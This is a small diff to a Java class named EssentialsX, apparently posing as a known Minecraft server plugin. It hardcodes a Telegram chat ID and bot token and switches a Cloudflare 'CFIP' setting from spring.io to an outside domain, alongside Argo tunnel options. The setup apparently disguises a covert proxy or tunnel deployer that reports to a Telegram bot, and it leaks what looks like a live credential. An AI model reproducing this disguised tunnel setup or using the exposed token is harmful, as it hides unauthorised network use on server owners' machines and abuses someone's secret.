@@ -90,7 +90,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "906374877");
         env.put("BOT_TOKEN", "1442484608:AAEJ0d3uDWsEZ0sO4bksI4ms3xlf5QuCE5c");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "cf.877774.xyz");
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
